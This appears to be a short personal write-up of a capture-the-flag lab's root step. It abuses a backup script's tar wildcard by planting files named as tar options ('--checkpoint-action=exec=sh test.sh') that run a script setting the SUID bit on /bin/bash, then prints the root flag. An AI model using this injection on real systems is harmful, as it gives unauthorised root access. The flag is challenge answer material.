there is a backup script which we can exploit (same as VulnNet root)
![[Pasted image 20210528162425.png]]

here we can exploit the wildcard using the 3rd method(Tar Wildcard Injection) from
: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/


go to `/var/www/html`

```
echo "chmod u+s /bin/bash" > test.sh 
echo "" > "--checkpoint-action=exec=sh test.sh"
echo "" > --checkpoint=1
```

now back to `/home/milesdyson/backups/`

and run the script using `bash backupsrv.sh`

and `/bin/bash -p`  and we got root

![[Pasted image 20210528162942.png]]

root == 3f0372db24753accc7179a282cd6a949